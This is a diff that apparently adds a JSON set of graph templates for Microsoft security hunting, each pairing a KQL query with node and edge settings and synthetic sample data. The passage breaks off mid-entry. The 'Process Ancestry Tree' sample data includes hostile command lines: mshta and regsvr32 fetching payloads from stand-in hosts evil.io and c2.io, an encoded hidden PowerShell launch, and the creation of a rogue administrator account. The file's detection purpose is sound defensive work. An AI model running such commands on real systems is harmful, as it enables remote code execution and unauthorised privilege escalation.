@@ -1,0 +1,1060 @@
+﻿[
+    {
+        "version":  1,
+        "name":  "Identity Logon Map",
+        "config":  {
+                       "title":  "Identity Logon Map",
+                       "icon":  "key",
+                       "query":  "IdentityLogonEvents\n| where TimeGenerated \u003e ago(7d)\n| where isnotempty(AccountDisplayName) and isnotempty(DeviceName)\n| project\n    timestamp  = TimeGenerated,\n    user       = AccountDisplayName,\n    machine    = DeviceName,\n    action     = ActionType,\n    src_ip     = IPAddress,\n    logon_type = LogonType,\n    protocol   = Protocol,\n    location   = Location\n| take 300",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "user",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "src_ip",
+                                                            "location",
+                                                            "logon_type"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "machine",
+                                         "type":  "machine",
+                                         "properties":  [
+                                                            "location"
+                                                        ]
+                                     }
+                                 ],
+                       "edges":  [
+                                     {
+                                         "from_column":  "user",
+                                         "to_column":  "machine",
+                                         "label_column":  "action",
+                                         "color_map":  {
+                                                           "LogonSuccess":  "#10b981",
+                                                           "LogonFailed":  "#ef4444"
+                                                       },
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "src_ip",
+                                                            "logon_type",
+                                                            "protocol",
+                                                            "location"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "csv":  "timestamp,user,machine,action,src_ip,logon_type,protocol,location\r\n2025-07-01 08:10,Alice Smith,PC-ALICE-01,LogonSuccess,10.1.1.5,Interactive,Kerberos,London\r\n2025-07-01 08:12,Alice Smith,SRV-FILE-01,LogonSuccess,10.1.1.5,Network,Kerberos,London\r\n2025-07-01 09:01,Bob Johnson,PC-BOB-01,LogonSuccess,10.1.2.8,Interactive,NTLM,Berlin\r\n2025-07-01 09:05,Bob Johnson,SRV-FILE-01,LogonSuccess,10.1.2.8,Network,Kerberos,Berlin\r\n2025-07-01 09:45,Bob Johnson,SRV-DC-01,LogonSuccess,10.1.2.8,Network,Kerberos,Berlin\r\n2025-07-01 10:22,Charlie Brown,PC-CHARLIE-01,LogonSuccess,10.1.3.12,Interactive,Kerberos,Milan\r\n2025-07-01 10:55,Charlie Brown,SRV-DC-01,LogonFailed,10.1.3.12,Network,NTLM,Milan\r\n2025-07-01 11:01,Charlie Brown,SRV-DC-01,LogonFailed,10.1.3.12,Network,NTLM,Milan\r\n2025-07-01 11:02,Charlie Brown,SRV-DC-01,LogonFailed,10.1.3.12,Network,NTLM,Milan\r\n2025-07-01 11:03,Charlie Brown,SRV-DC-01,LogonSuccess,10.1.3.12,Network,Kerberos,Milan\r\n2025-07-01 11:15,Charlie Brown,SRV-SQL-01,LogonSuccess,10.1.3.12,Network,Kerberos,Milan\r\n2025-07-01 11:30,Alice Smith,SRV-DC-01,LogonFailed,10.1.1.5,Network,NTLM,London\r\n2025-07-01 12:00,Bob Johnson,SRV-SQL-01,LogonSuccess,10.1.2.8,Network,Kerberos,Berlin"
+    },
+    {
+        "version":  1,
+        "name":  "Network Lateral Movement",
+        "config":  {
+                       "title":  "Network Lateral Movement",
+                       "icon":  "web",
+                       "query":  "DeviceNetworkEvents\n| where TimeGenerated \u003e ago(1d)\n| where ActionType in (\"ConnectionSuccess\", \"ConnectionFailed\")\n| extend protocol = case(\n    RemotePort == 445,  \"SMB\",\n    RemotePort == 389,  \"LDAP\",\n    RemotePort == 3389, \"RDP\",\n    RemotePort == 1433, \"TDS\",\n    RemotePort == 443,  \"HTTPS\",\n    RemotePort == 53,   \"DNS\",\n    tostring(RemotePort))\n| project\n    timestamp     = TimeGenerated,\n    source_device = DeviceName,\n    dest_device   = RemoteDeviceName,\n    dest_ip       = RemoteIP,\n    protocol,\n    bytes_sent    = SentBytes,\n    action        = ActionType\n| take 300",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "source_device",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "dest_device",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "dest_ip",
+                                         "type":  "ip",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "edges":  [
+                                     {
+                                         "from_column":  "source_device",
+                                         "to_column":  "dest_device",
+                                         "label_column":  "protocol",
+                                         "color_map":  {
+                                                           "SMB":  "#f59e0b",
+                                                           "LDAP":  "#60a5fa",
+                                                           "RDP":  "#ef4444",
+                                                           "TDS":  "#a78bfa",
+                                                           "HTTPS":  "#10b981"
+                                                       },
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "bytes_sent",
+                                                            "action"
+                                                        ]
+                                     },
+                                     {
+                                         "from_column":  "source_device",
+                                         "to_column":  "dest_ip",
+                                         "label_column":  "protocol",
+                                         "color_map":  {
+                                                           "HTTPS":  "#10b981",
+                                                           "DNS":  "#6b7280",
+                                                           "RDP":  "#ef4444"
+                                                       },
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "bytes_sent",
+                                                            "action"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "csv":  "timestamp,source_device,dest_device,dest_ip,protocol,bytes_sent,action\r\n2025-07-01 14:01,PC-BOB-01,SRV-FILE-01,,SMB,12400,ConnectionSuccess\r\n2025-07-01 14:03,SRV-FILE-01,SRV-DC-01,,LDAP,980,ConnectionSuccess\r\n2025-07-01 14:04,SRV-DC-01,SRV-SQL-01,,TDS,45000,ConnectionSuccess\r\n2025-07-01 14:06,SRV-SQL-01,SRV-BACKUP-01,,SMB,200000,ConnectionSuccess\r\n2025-07-01 14:08,PC-BOB-01,SRV-DC-01,,SMB,1100,ConnectionSuccess\r\n2025-07-01 14:10,PC-CHARLIE-01,SRV-DC-01,,RDP,8800,ConnectionSuccess\r\n2025-07-01 14:15,SRV-DC-01,SRV-EXCHANGE-01,,LDAP,540,ConnectionSuccess\r\n2025-07-01 14:20,PC-CHARLIE-01,,203.0.113.45,HTTPS,5400,ConnectionSuccess\r\n2025-07-01 14:22,SRV-SQL-01,,198.51.100.12,DNS,120,ConnectionSuccess\r\n2025-07-01 14:25,SRV-DC-01,,185.220.101.9,RDP,0,ConnectionFailed\r\n2025-07-01 14:30,SRV-BACKUP-01,,185.220.101.9,HTTPS,98000,ConnectionSuccess"
+    },
+    {
+        "version":  1,
+        "name":  "Email Threat Map",
+        "config":  {
+                       "title":  "Email Threat Map",
+                       "icon":  "email",
+                       "query":  "EmailAttachmentInfo\n| where TimeGenerated \u003e ago(7d)\n| where isnotempty(ThreatTypes)\n| project\n    timestamp   = TimeGenerated,\n    sender      = SenderFromAddress,\n    recipient   = RecipientEmailAddress,\n    filename    = FileName,\n    filetype    = FileType,\n    threat_type = ThreatTypes,\n    sha256      = substring(SHA256, 0, 16)\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "sender",
+                                         "type":  "user",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "recipient",
+                                         "type":  "user",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "filename",
+                                         "type":  "file",
+                                         "properties":  [
+                                                            "filetype",
+                                                            "sha256"
+                                                        ]
+                                     }
+                                 ],
+                       "edges":  [
+                                     {
+                                         "from_column":  "sender",
+                                         "to_column":  "filename",
+                                         "label_column":  "threat_type",
+                                         "color_map":  {
+                                                           "Malware":  "#ef4444",
+                                                           "Phishing":  "#f59e0b",
+                                                           "Spam":  "#6b7280"
+                                                       },
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "threat_type",
+                                                            "sha256"
+                                                        ]
+                                     },
+                                     {
+                                         "from_column":  "filename",
+                                         "to_column":  "recipient",
+                                         "label_column":  "filetype",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "filetype"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "csv":  "timestamp,sender,recipient,filename,filetype,threat_type,sha256\r\n2025-07-01 07:02,attacker@evil.io,alice@contoso.com,invoice_Q3.docm,DocM,Malware,3a4f9c1e2b7d8e0f\r\n2025-07-01 07:02,attacker@evil.io,bob@contoso.com,invoice_Q3.docm,DocM,Malware,3a4f9c1e2b7d8e0f\r\n2025-07-01 07:05,attacker@evil.io,charlie@contoso.com,invoice_Q3.docm,DocM,Malware,3a4f9c1e2b7d8e0f\r\n2025-07-01 09:14,phisher@fake-bank.com,alice@contoso.com,secure_document.html,HTML,Phishing,b1c2d3e4f5a6b7c8\r\n2025-07-01 09:14,phisher@fake-bank.com,diana@contoso.com,secure_document.html,HTML,Phishing,b1c2d3e4f5a6b7c8\r\n2025-07-01 11:30,bulk@promo.biz,bob@contoso.com,special_offer.pdf,PDF,Spam,0000000000000000\r\n2025-07-01 13:45,attacker2@darknet.ru,charlie@contoso.com,update_patch.exe,EXE,Malware,9f8e7d6c5b4a3210\r\n2025-07-01 13:45,attacker2@darknet.ru,eve@contoso.com,update_patch.exe,EXE,Malware,9f8e7d6c5b4a3210"
+    },
+    {
+        "version":  1,
+        "name":  "Cloud App Sign-in Risk",
+        "config":  {
+                       "title":  "Cloud App Sign-in Risk",
+                       "icon":  "cloud",
+                       "query":  "SigninLogs\n| where TimeGenerated \u003e ago(7d)\n| extend\n    result     = iff(ResultType == \"0\", \"Success\", \"Failure\"),\n    risk_level = iff(isnotempty(RiskLevelDuringSignIn) and RiskLevelDuringSignIn != \"none\",\n                     RiskLevelDuringSignIn, result)\n| project\n    timestamp  = TimeGenerated,\n    user       = UserPrincipalName,\n    app        = AppDisplayName,\n    result,\n    risk_level,\n    location   = tostring(LocationDetails.city),\n    ip         = IPAddress\n| take 300",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "user",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "ip",
+                                                            "location"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "app",
+                                         "type":  "cloud",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "edges":  [
+                                     {
+                                         "from_column":  "user",
+                                         "to_column":  "app",
+                                         "label_column":  "risk_level",
+                                         "color_map":  {
+                                                           "high":  "#ef4444",
+                                                           "medium":  "#f59e0b",
+                                                           "low":  "#facc15",
+                                                           "Success":  "#10b981",
+                                                           "Failure":  "#6b7280"
+                                                       },
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "result",
+                                                            "risk_level",
+                                                            "location",
+                                                            "ip"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "csv":  "timestamp,user,app,result,risk_level,location,ip\r\n2025-07-01 08:00,alice@contoso.com,Microsoft Teams,Success,Success,London,10.1.1.5\r\n2025-07-01 08:05,alice@contoso.com,SharePoint Online,Success,Success,London,10.1.1.5\r\n2025-07-01 08:10,alice@contoso.com,Azure Portal,Success,Success,London,10.1.1.5\r\n2025-07-01 09:00,bob@contoso.com,Microsoft Teams,Success,Success,Berlin,10.1.2.8\r\n2025-07-01 09:05,bob@contoso.com,Exchange Online,Success,Success,Berlin,10.1.2.8\r\n2025-07-01 09:50,charlie@contoso.com,Azure Portal,Success,medium,Milan,10.1.3.12\r\n2025-07-01 10:00,charlie@contoso.com,Azure Portal,Failure,Failure,TorExitNode,185.220.101.9\r\n2025-07-01 10:01,charlie@contoso.com,Azure Portal,Failure,high,TorExitNode,185.220.101.9\r\n2025-07-01 10:05,charlie@contoso.com,SharePoint Online,Success,high,TorExitNode,185.220.101.9\r\n2025-07-01 11:00,diana@contoso.com,Microsoft Teams,Success,Success,Paris,10.1.4.3\r\n2025-07-01 11:10,diana@contoso.com,Power BI,Success,low,Paris,10.1.4.3\r\n2025-07-01 12:00,eve@contoso.com,Azure Portal,Failure,Failure,Beijing,203.0.113.88\r\n2025-07-01 12:01,eve@contoso.com,Exchange Online,Failure,Failure,Beijing,203.0.113.88"
+    },
+    {
+        "version":  1,
+        "name":  "Process Ancestry Tree",
+        "config":  {
+                       "title":  "Process Ancestry Tree",
+                       "icon":  "gear",
+                       "query":  "DeviceProcessEvents\n| where TimeGenerated \u003e ago(1d)\n| where isnotempty(InitiatingProcessFileName) and isnotempty(FileName)\n// Focus on suspicious parent processes\n| where InitiatingProcessFileName in~ (\"powershell.exe\", \"cmd.exe\", \"wscript.exe\", \"mshta.exe\", \"rundll32.exe\", \"regsvr32.exe\", \"explorer.exe\")\n| project\n    timestamp      = TimeGenerated,\n    device         = DeviceName,\n    parent_process = InitiatingProcessFileName,\n    child_process  = FileName,\n    cmdline        = substring(ProcessCommandLine, 0, 60),\n    account        = AccountName\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "device",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "parent_process",
+                                         "type":  "process",
+                                         "properties":  [
+                                                            "account"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "child_process",
+                                         "type":  "process",
+                                         "properties":  [
+                                                            "cmdline",
+                                                            "account"
+                                                        ]
+                                     }
+                                 ],
+                       "edges":  [
+                                     {
+                                         "from_column":  "device",
+                                         "to_column":  "parent_process",
+                                         "label":  "runs",
+                                         "properties":  [
+                                                            "account",
+                                                            "timestamp"
+                                                        ]
+                                     },
+                                     {
+                                         "from_column":  "parent_process",
+                                         "to_column":  "child_process",
+                                         "label_column":  "cmdline",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "account",
+                                                            "cmdline"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "csv":  "timestamp,device,parent_process,child_process,cmdline,account\r\n2025-07-01 14:00,PC-CHARLIE-01,explorer.exe,powershell.exe,powershell.exe -nop -w hidden -enc JABjAG,charlie\r\n2025-07-01 14:00,PC-CHARLIE-01,powershell.exe,cmd.exe,cmd.exe /c whoami,charlie\r\n2025-07-01 14:01,PC-CHARLIE-01,powershell.exe,mshta.exe,mshta.exe http://evil.io/payload.hta,charlie\r\n2025-07-01 14:01,PC-CHARLIE-01,mshta.exe,wscript.exe,wscript.exe //b dropper.vbs,charlie\r\n2025-07-01 14:02,PC-CHARLIE-01,wscript.exe,cmd.exe,cmd.exe /c net user hacker P@ss /add,charlie\r\n2025-07-01 14:03,PC-CHARLIE-01,cmd.exe,net.exe,net.exe localgroup administrators hacker /add,charlie\r\n2025-07-01 14:30,SRV-FILE-01,explorer.exe,powershell.exe,powershell.exe -ep bypass -f scan.ps1,SYSTEM\r\n2025-07-01 14:31,SRV-FILE-01,powershell.exe,rundll32.exe,rundll32.exe shell32.dll,SYSTEM\r\n2025-07-01 14:32,SRV-FILE-01,rundll32.exe,regsvr32.exe,regsvr32.exe /s /n /u /i:http://c2.io,SYSTEM\r\n2025-07-01 15:00,PC-BOB-01,explorer.exe,cmd.exe,cmd.exe /k,bob\r\n2025-07-01 15:01,PC-BOB-01,cmd.exe,powershell.exe,powershell.exe Get-Process,bob"
+    },
+    {
+        "csv":  "timestamp,device,process,file,folder,action,account,sha256\r\n2025-07-01 08:00,PC-ALICE-01,explorer.exe,report_Q2.docx,C:\\Users\\alice\\Documents,FileCreated,alice,3a4f9c1e2b7d8e0f\r\n2025-07-01 08:05,PC-ALICE-01,winword.exe,report_Q2.docx,C:\\Users\\alice\\Documents,FileModified,alice,3a4f9c1e2b7d8e0f\r\n2025-07-01 09:00,PC-BOB-01,powershell.exe,payload.ps1,C:\\Temp,FileCreated,bob,9f8e7d6c5b4a3210\r\n2025-07-01 09:01,PC-BOB-01,powershell.exe,out.txt,C:\\Temp,FileCreated,bob,0000000000000000\r\n2025-07-01 09:02,PC-BOB-01,cmd.exe,out.txt,C:\\Temp,FileDeleted,bob,0000000000000000\r\n2025-07-01 10:00,SRV-FILE-01,svchost.exe,config.bak,C:\\Windows\\Temp,FileCreated,SYSTEM,aabbccddeeff0011\r\n2025-07-01 10:05,SRV-FILE-01,rundll32.exe,config.bak,C:\\Windows\\Temp,FileModified,SYSTEM,aabbccddeeff0011\r\n2025-07-01 11:00,PC-CHARLIE-01,mshta.exe,dropper.vbs,C:\\Users\\charlie\\AppData,FileCreated,charlie,1234567890abcdef\r\n2025-07-01 11:01,PC-CHARLIE-01,wscript.exe,dropper.vbs,C:\\Users\\charlie\\AppData,FileDeleted,charlie,1234567890abcdef",
+        "version":  1,
+        "config":  {
+                       "title":  "Process File Activity",
+                       "query":  "DeviceFileEvents\r\n| where TimeGenerated \u003e ago(1d)\r\n| where isnotempty(InitiatingProcessFileName) and isnotempty(FileName)\r\n| where ActionType in (\"FileCreated\", \"FileModified\", \"FileDeleted\", \"FileRenamed\")\r\n| project\r\n    timestamp = TimeGenerated,\r\n    device    = DeviceName,\r\n    process   = InitiatingProcessFileName,\r\n    file      = FileName,\r\n    folder    = FolderPath,\r\n    action    = ActionType,\r\n    account   = InitiatingProcessAccountName,\r\n    sha256    = substring(SHA256, 0, 16)\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "device",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "process",
+                                         "type":  "process",
+                                         "properties":  [
+                                                            "account"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "file",
+                                         "type":  "file",
+                                         "properties":  [
+                                                            "folder",
+                                                            "sha256"
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "files",
+                       "edges":  [
+                                     {
+                                         "to_column":  "process",
+                                         "label":  "runs",
+                                         "from_column":  "device",
+                                         "properties":  [
+                                                            "account",
+                                                            "timestamp"
+                                                        ]
+                                     },
+                                     {
+                                         "label_column":  "action",
+                                         "to_column":  "file",
+                                         "color_map":  {
+                                                           "FileRenamed":  "#60a5fa",
+                                                           "FileModified":  "#f59e0b",
+                                                           "FileDeleted":  "#ef4444",
+                                                           "FileCreated":  "#10b981"
+                                                       },
+                                         "from_column":  "process",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "folder",
+                                                            "account",
+                                                            "sha256"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Process File Activity"
+    },
+    {
+        "csv":  "timestamp,device,process,account,registry_key,value_name,action\r\n2025-07-01 14:00,PC-CHARLIE-01,powershell.exe,charlie,Run,MalwarePersist,RegistryValueSet\r\n2025-07-01 14:01,PC-CHARLIE-01,powershell.exe,charlie,RunOnce,Updater,RegistryValueSet\r\n2025-07-01 14:02,PC-CHARLIE-01,cmd.exe,charlie,Services,FakeService,RegistryKeyCreated\r\n2025-07-01 14:30,SRV-FILE-01,rundll32.exe,SYSTEM,Winlogon,Userinit,RegistryValueSet\r\n2025-07-01 15:00,PC-BOB-01,mshta.exe,bob,Run,WindowsUpdate,RegistryValueSet\r\n2025-07-01 15:01,PC-BOB-01,wscript.exe,bob,Startup,helper.vbs,RegistryValueSet\r\n2025-07-01 16:00,SRV-DC-01,regsvr32.exe,SYSTEM,AppInit,evilDll.dll,RegistryValueSet",
+        "version":  1,
+        "config":  {
+                       "title":  "Registry Persistence Tracker",
+                       "query":  "DeviceRegistryEvents\r\n| where TimeGenerated \u003e ago(1d)\r\n| where RegistryKey has_any (\"Run\", \"RunOnce\", \"Services\", \"Startup\", \"Winlogon\", \"AppInit\")\r\n| where ActionType in (\"RegistryValueSet\", \"RegistryKeyCreated\")\r\n| project\r\n    timestamp    = TimeGenerated,\r\n    device       = DeviceName,\r\n    process      = InitiatingProcessFileName,\r\n    account      = InitiatingProcessAccountName,\r\n    registry_key = tostring(split(RegistryKey, \"\\\\\")[-1]),\r\n    value_name   = RegistryValueName,\r\n    action       = ActionType\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "device",
+                                         "type":  "machine",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "process",
+                                         "type":  "process",
+                                         "properties":  [
+                                                            "account"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "registry_key",
+                                         "type":  "registry",
+                                         "properties":  [
+                                                            "value_name"
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "wrench",
+                       "edges":  [
+                                     {
+                                         "to_column":  "process",
+                                         "label":  "runs",
+                                         "from_column":  "device",
+                                         "properties":  [
+                                                            "account",
+                                                            "timestamp"
+                                                        ]
+                                     },
+                                     {
+                                         "label_column":  "action",
+                                         "to_column":  "registry_key",
+                                         "color_map":  {
+                                                           "RegistryKeyCreated":  "#f59e0b",
+                                                           "RegistryValueSet":  "#ef4444"
+                                                       },
+                                         "from_column":  "process",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "account",
+                                                            "value_name"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Registry Persistence Tracker"
+    },
+    {
+        "csv":  "timestamp,source_device,actor,query_type,queried_target,ip,dest_device\r\n2025-07-01 13:00,PC-BOB-01,bob,SamrEnumerateGroups,Domain Admins,10.1.2.8,SRV-DC-01\r\n2025-07-01 13:01,PC-BOB-01,bob,SamrEnumerateGroups,Enterprise Admins,10.1.2.8,SRV-DC-01\r\n2025-07-01 13:02,PC-BOB-01,bob,SamrQueryUser,alice,10.1.2.8,SRV-DC-01\r\n2025-07-01 13:03,PC-BOB-01,bob,SamrQueryUser,svc-backup,10.1.2.8,SRV-DC-01\r\n2025-07-01 13:10,PC-CHARLIE-01,charlie,Ldap query,Domain Admins,10.1.3.12,SRV-DC-01\r\n2025-07-01 13:11,PC-CHARLIE-01,charlie,Ldap query,krbtgt,10.1.3.12,SRV-DC-01\r\n2025-07-01 13:12,PC-CHARLIE-01,charlie,SamrLookupNames,Administrator,10.1.3.12,SRV-DC-01\r\n2025-07-01 13:20,SRV-FILE-01,SYSTEM,SamrEnumerateGroups,Backup Operators,10.1.5.10,SRV-DC-01",
+        "version":  1,
+        "config":  {
+                       "title":  "AD Reconnaissance Map",
+                       "query":  "IdentityQueryEvents\r\n| where TimeGenerated \u003e ago(1d)\r\n| where isnotempty(DeviceName) and isnotempty(QueryTarget)\r\n| project\r\n    timestamp      = TimeGenerated,\r\n    source_device  = DeviceName,\r\n    actor          = AccountDisplayName,\r\n    query_type     = QueryType,\r\n    queried_target = QueryTarget,\r\n    ip             = IPAddress,\r\n    dest_device    = DestinationDeviceName\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "source_device",
+                                         "type":  "machine",
+                                         "properties":  [
+                                                            "actor",
+                                                            "ip"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "queried_target",
+                                         "type":  "user",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "search",
+                       "edges":  [
+                                     {
+                                         "label_column":  "query_type",
+                                         "to_column":  "queried_target",
+                                         "color_map":  {
+                                                           "SamrLookupNames":  "#a78bfa",
+                                                           "Ldap query":  "#60a5fa",
+                                                           "SamrQueryUser":  "#f59e0b",
+                                                           "SamrEnumerateGroups":  "#ef4444"
+                                                       },
+                                         "from_column":  "source_device",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "actor",
+                                                            "ip",
+                                                            "dest_device"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "AD Reconnaissance Map"
+    },
+    {
+        "csv":  "timestamp,actor,target,action,device,target_device\r\n2025-07-01 09:00,Admin,alice,Add member to group,SRV-DC-01,\r\n2025-07-01 09:05,Admin,bob,Add member to group,SRV-DC-01,\r\n2025-07-01 10:00,Admin,charlie,User account password changed,SRV-DC-01,\r\n2025-07-01 10:30,charlie,svc-backup,Add member to group,PC-CHARLIE-01,\r\n2025-07-01 11:00,charlie,hacker,User account created,PC-CHARLIE-01,\r\n2025-07-01 11:05,charlie,hacker,Add member to group,PC-CHARLIE-01,\r\n2025-07-01 12:00,Admin,hacker,Remove member from group,SRV-DC-01,\r\n2025-07-01 12:01,Admin,hacker,User account deleted,SRV-DC-01,",
+        "version":  1,
+        "config":  {
+                       "title":  "Active Directory Changes",
+                       "query":  "IdentityDirectoryEvents\r\n| where TimeGenerated \u003e ago(7d)\r\n| where isnotempty(AccountDisplayName) and isnotempty(TargetAccountDisplayName)\r\n| project\r\n    timestamp     = TimeGenerated,\r\n    actor         = AccountDisplayName,\r\n    target        = TargetAccountDisplayName,\r\n    action        = ActionType,\r\n    device        = DeviceName,\r\n    target_device = TargetDeviceName\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "actor",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "device"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "target",
+                                         "type":  "user",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "person",
+                       "edges":  [
+                                     {
+                                         "label_column":  "action",
+                                         "to_column":  "target",
+                                         "color_map":  {
+                                                           "Remove member from group":  "#ef4444",
+                                                           "Add member to group":  "#10b981",
+                                                           "User account password changed":  "#f59e0b",
+                                                           "User account created":  "#60a5fa",
+                                                           "User account deleted":  "#7f1d1d"
+                                                       },
+                                         "from_column":  "actor",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "device",
+                                                            "target_device"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Active Directory Changes"
+    },
+    {
+        "csv":  "timestamp,user,app,action,object,ip,country,city\r\n2025-07-01 08:00,alice@contoso.com,SharePoint Online,FileDownloaded,Budget_2025.xlsx,10.1.1.5,IT,Rome\r\n2025-07-01 08:10,alice@contoso.com,OneDrive,FileUploaded,report_draft.docx,10.1.1.5,IT,Rome\r\n2025-07-01 09:00,bob@contoso.com,SharePoint Online,FileDownloaded,HR_Database.xlsx,10.1.2.8,DE,Berlin\r\n2025-07-01 09:05,bob@contoso.com,SharePoint Online,SharingSet,HR_Database.xlsx,10.1.2.8,DE,Berlin\r\n2025-07-01 09:30,charlie@contoso.com,OneDrive,FileDownloaded,source_code.zip,185.220.101.9,RU,Moscow\r\n2025-07-01 09:31,charlie@contoso.com,OneDrive,FileDownloaded,credentials.txt,185.220.101.9,RU,Moscow\r\n2025-07-01 10:00,diana@contoso.com,SharePoint Online,FileUploaded,Q3_report.pptx,10.1.4.3,FR,Paris\r\n2025-07-01 10:30,charlie@contoso.com,OneDrive,SharingSet,source_code.zip,185.220.101.9,RU,Moscow",
+        "version":  1,
+        "config":  {
+                       "title":  "Cloud App File Activity",
+                       "query":  "CloudAppEvents\r\n| where TimeGenerated \u003e ago(1d)\r\n| where isnotempty(AccountDisplayName) and isnotempty(Application)\r\n| where ActionType has_any (\"Download\", \"Upload\", \"Share\", \"Access\", \"FileDownloaded\", \"FileUploaded\", \"SharingSet\")\r\n| project\r\n    timestamp = TimeGenerated,\r\n    user      = AccountDisplayName,\r\n    app       = Application,\r\n    action    = ActionType,\r\n    object    = ObjectName,\r\n    ip        = IPAddress,\r\n    country   = CountryCode,\r\n    city      = City\r\n| take 300",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "user",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "ip",
+                                                            "country",
+                                                            "city"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "app",
+                                         "type":  "cloud",
+                                         "properties":  [
+
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "object",
+                                         "type":  "file",
+                                         "properties":  [
+
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "openfolder",
+                       "edges":  [
+                                     {
+                                         "label_column":  "action",
+                                         "to_column":  "app",
+                                         "color_map":  {
+                                                           "SharingSet":  "#ef4444",
+                                                           "FileUploaded":  "#10b981",
+                                                           "FileDownloaded":  "#f59e0b"
+                                                       },
+                                         "from_column":  "user",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "ip",
+                                                            "country",
+                                                            "city"
+                                                        ]
+                                     },
+                                     {
+                                         "to_column":  "object",
+                                         "label":  "contains",
+                                         "from_column":  "app",
+                                         "properties":  [
+                                                            "timestamp",
+                                                            "action"
+                                                        ]
+                                     }
+                                 ]
+                   },
+        "name":  "Cloud App File Activity"
+    },
+    {
+        "csv":  "timestamp,user,upn,risk_event_type,risk_level,risk_state,ip,detection_type\r\n2025-07-01 08:00,Charlie Brown,charlie@contoso.com,anonymizedIPAddress,high,atRisk,185.220.101.9,realtime\r\n2025-07-01 08:05,Charlie Brown,charlie@contoso.com,unfamiliarFeatures,medium,atRisk,185.220.101.9,realtime\r\n2025-07-01 09:00,Bob Johnson,bob@contoso.com,suspiciousInboxForwarding,medium,atRisk,10.1.2.8,offline\r\n2025-07-01 10:00,Eve Wilson,eve@contoso.com,anonymizedIPAddress,high,atRisk,203.0.113.88,realtime\r\n2025-07-01 10:05,Eve Wilson,eve@contoso.com,maliciousIPAddress,high,atRisk,203.0.113.88,realtime\r\n2025-07-01 11:00,Alice Smith,alice@contoso.com,leakedCredentials,high,remediated,10.1.1.5,offline\r\n2025-07-01 12:00,Diana Prince,diana@contoso.com,unlikelyTravel,low,dismissed,10.1.4.3,offline",
+        "version":  1,
+        "config":  {
+                       "title":  "User Risk Events",
+                       "query":  "AADUserRiskEvents\r\n| where TimeGenerated \u003e ago(30d)\r\n| where isnotempty(UserDisplayName) and isnotempty(RiskEventType)\r\n| project\r\n    timestamp       = TimeGenerated,\r\n    user            = UserDisplayName,\r\n    upn             = UserPrincipalName,\r\n    risk_event_type = RiskEventType,\r\n    risk_level      = RiskLevel,\r\n    risk_state      = RiskState,\r\n    ip              = IpAddress,\r\n    detection_type  = DetectionTimingType\r\n| take 200",
+                       "nodes":  [
+                                     {
+                                         "id_column":  "user",
+                                         "type":  "user",
+                                         "properties":  [
+                                                            "upn",
+                                                            "ip"
+                                                        ]
+                                     },
+                                     {
+                                         "id_column":  "risk_event_type",
+                                         "type":  "alert",
+                                         "properties":  [
+                                                            "detection_type"
+                                                        ]
+                                     }
+                                 ],
+                       "icon":  "warning",
+                       "edges":  [
+                                     {
+                                         "label_column":  "risk_level",
+                                         "to_column":  "risk_event_type",
+                                         "color_map":  {
